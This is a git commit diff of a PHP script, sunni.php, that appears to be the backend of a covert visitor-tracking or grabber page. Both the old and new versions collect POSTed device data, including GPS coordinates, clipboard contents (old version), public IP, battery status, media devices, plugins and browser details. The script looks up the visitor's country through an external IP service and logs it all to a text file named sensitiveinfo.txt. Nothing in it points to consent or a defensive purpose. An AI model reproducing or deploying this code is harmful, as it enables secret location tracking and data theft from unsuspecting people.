39ee303ddb391e8d04dd21d6071ce615db1e355a
Jhon Stark <131217436+cool4388@users.noreply.github.com>
2024-08-05 14:01:35 +0500

    sunni.php

--- sunni.php
+++ sunni.php
@@ -1,75 +1,75 @@
 <?php
 error_reporting(0);
 
-// Retrieve the posted data
-$networkinfo = $_POST['networkinformation'] ?? 'N/A';
-$batterypercentage = $_POST['batterypercentage'] ?? 'N/A';
-$ischarging = $_POST['ischarging'] ?? 'N/A';
-$width = $_POST['width'] ?? 'N/A';
-$height = $_POST['height'] ?? 'N/A';
-$platform = $_POST['platform'] ?? 'N/A';
-$gps = $_POST['gps'] ?? 'N/A';
-$localtime = $_POST['localtime'] ?? 'N/A';
-$devicelang = $_POST['devicelang'] ?? 'N/A';
-$iscookieEnabled = $_POST['iscookieEnabled'] ?? 'N/A';
-$useragent = $_POST['useragent'] ?? 'N/A';
-$deviceram = $_POST['deviceram'] ?? 'N/A';
-$cpuThreads = $_POST['cpuThreads'] ?? 'N/A';
-$referurl = $_POST['referurl'] ?? 'N/A';
-$clipboard = $_POST['clipboard'] ?? 'N/A';
-$timezoneOffset = $_POST['timezoneOffset'] ?? 'N/A';
-$osVersion = $_POST['osVersion'] ?? 'N/A';
-$browserName = $_POST['browserName'] ?? 'N/A';
-$browserVersion = $_POST['browserVersion'] ?? 'N/A';
-$plugins = $_POST['plugins'] ?? 'N/A';
-$doNotTrack = $_POST['doNotTrack'] ?? 'N/A';
-$touchSupport = $_POST['touchSupport'] ?? 'N/A';
-$colorDepth = $_POST['colorDepth'] ?? 'N/A';
-$availScreenWidth = $_POST['availScreenWidth'] ?? 'N/A';
-$availScreenHeight = $_POST['availScreenHeight'] ?? 'N/A';
-$onlineStatus = $_POST['onlineStatus'] ?? 'N/A';
-$pixelRatio = $_POST['pixelRatio'] ?? 'N/A';
+// Retrieve data from POST request
+$networkinfo = $_POST['networkinformation'];
+$batterypercentage = $_POST['batterypercentage'];
+$ischarging = $_POST['ischarging'];
+$width = $_POST['width'];
+$height = $_POST['height'];
+$platform = $_POST['platform'];
+$gps = $_POST['gps'];
+$localtime = $_POST['localtime'];
+$devicelang = $_POST['devicelang'];
+$iscookieEnabled = $_POST['iscookieEnabled'];
+$useragent = $_POST['useragent'];
+$deviceram = $_POST['deviceram'];
+$cpuThreads = $_POST['cpuThreads'];
+$referurl = $_POST['referurl'];
+$publicIp = $_POST['publicIp'];
+$os = $_POST['os'];
+$browserName = $_POST['browserName'];
+$browserVersion = $_POST['browserVersion'];
+$touchScreen = $_POST['touchScreen'];
+$viewportWidth = $_POST['viewportWidth'];
+$viewportHeight = $_POST['viewportHeight'];
+$timezone = $_POST['timezone'];
+$colorDepth = $_POST['colorDepth'];
+$pixelRatio = $_POST['pixelRatio'];
+$mediaDevices = $_POST['mediaDevices'];
+$preferredLanguages = $_POST['preferredLanguages'];
 
-// Get IP address and country information
+// Retrieve IP address
 $ip = $_SERVER['REMOTE_ADDR'];
+
+// Fetch country details using IP
 $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-$ulke = $details->country ?? 'Unknown';
+$country = $details->country;
 
-// Set timezone and get current date and time
+// Set timezone and current date/time
 date_default_timezone_set('Asia/Karachi');
-$tarih = date("d-m-Y H:i:s");
+$currentDateTime = date("d-m-Y H:i:s");
 
-// Open file for appending and write data
-$file = fopen('info.txt', 'a');
-fwrite($file, "Ip Address: " .$ip."\n\n".
-"Country: ".$ulke ."\n\n".
-"NetworkInformation: ".$networkinfo."\n\n".
-"BatteryPercentage: ".$batterypercentage."\n\n".
-"IsCharging: ".$ischarging."\n\n".
-"ScreenWidth: ".$width."\n\n".
-"ScreenHeight: ".$height."\n\n".
-"Platform: ".$platform."\n\n".
-"GPS: ".$gps."\n\n".
-"DeviceLocalTime: ".$localtime."\n\n".
-"DeviceLanguage: ".$devicelang."\n\n".
-"CookieEnabled: ".$iscookieEnabled."\n\n".
-"UserAgent: ".$useragent."\n\n".
-"DeviceMemory: ".$deviceram."\n\n".
-"CpuThreads: ".$cpuThreads."\n\n".
-"Clipboard: ".$clipboard."\n\n".
-"ReferUrl: ".$referurl."\n\n".
-"TimezoneOffset: ".$timezoneOffset."\n\n".
-"OS Version: ".$osVersion."\n\n".
-"Browser Name: ".$browserName."\n\n".
-"Browser Version: ".$browserVersion."\n\n".
-"Installed Plugins: ".$plugins."\n\n".
-"Do Not Track: ".$doNotTrack."\n\n".
-"Touch Support: ".$touchSupport."\n\n".
-"Color Depth: ".$colorDepth."\n\n".
-"Available Screen Width: ".$availScreenWidth."\n\n".
-"Available Screen Height: ".$availScreenHeight."\n\n".
-"Online Status: ".$onlineStatus."\n\n".
-"Device Pixel Ratio: ".$pixelRatio."\n\n".
-"Timestamp: ".$tarih."\n\n\n\n");
+// Log data to a file
+$file = fopen('sensitiveinfo.txt', 'a');
+fwrite($file, "Ip Address: " . $ip . "\n\n" .
+    "Country: " . $country . "\n\n" .
+    "NetworkInformation: " . $networkinfo . "\n\n" .
+    "BatteryPercentage: " . $batterypercentage . "\n\n" .
+    "IsCharging: " . $ischarging . "\n\n" .
+    "ScreenWidth: " . $width . "\n\n" .
+    "ScreenHeight: " . $height . "\n\n" .
+    "Platform: " . $platform . "\n\n" .
+    "GPS: " . $gps . "\n\n" .
+    "DeviceLocalTime: " . $localtime . "\n\n" .
+    "DeviceLanguage: " . $devicelang . "\n\n" .
+    "CookieEnabled: " . $iscookieEnabled . "\n\n" .
+    "UserAgent: " . $useragent . "\n\n" .
+    "DeviceMemory: " . $deviceram . "\n\n" .
+    "CPUThreads: " . $cpuThreads . "\n\n" .
+    "ReferUrl: " . $referurl . "\n\n" .
+    "PublicIp: " . $publicIp . "\n\n" .
+    "OS: " . $os . "\n\n" .
+    "BrowserName: " . $browserName . "\n\n" .
+    "BrowserVersion: " . $browserVersion . "\n\n" .
+    "TouchScreen: " . $touchScreen . "\n\n" .
+    "ViewportWidth: " . $viewportWidth . "\n\n" .
+    "ViewportHeight: " . $viewportHeight . "\n\n" .
+    "TimeZone: " . $timezone . "\n\n" .
+    "ColorDepth: " . $colorDepth . "\n\n" .
+    "PixelRatio: " . $pixelRatio . "\n\n" .
+    "MediaDevices: " . $mediaDevices . "\n\n" .
+    "PreferredLanguages: " . $preferredLanguages . "\n\n" .
+    "DateTime: " . $currentDateTime . "\n\n");
 fclose($file);
 ?>
